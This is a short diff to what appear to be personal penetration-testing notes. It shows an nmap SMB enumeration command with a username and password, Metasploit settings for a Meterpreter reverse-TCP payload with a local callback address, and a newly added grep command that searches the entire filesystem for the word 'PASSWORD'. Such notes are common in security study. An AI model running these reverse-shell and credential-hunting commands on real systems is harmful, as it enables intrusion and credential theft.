@@ -24,3 +24,5 @@ nmap --script smb-enum* --script-args smbusername=IEUSER,smbpass=PA$$WORD! -p445
 after putting target and rhost and lhost 
 >set payload windows/x64/meterpreter/reverse_tcp
 >set lhost 192.168.1.4
+
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null ==> to search for the word "PASSWORD" in all files of /
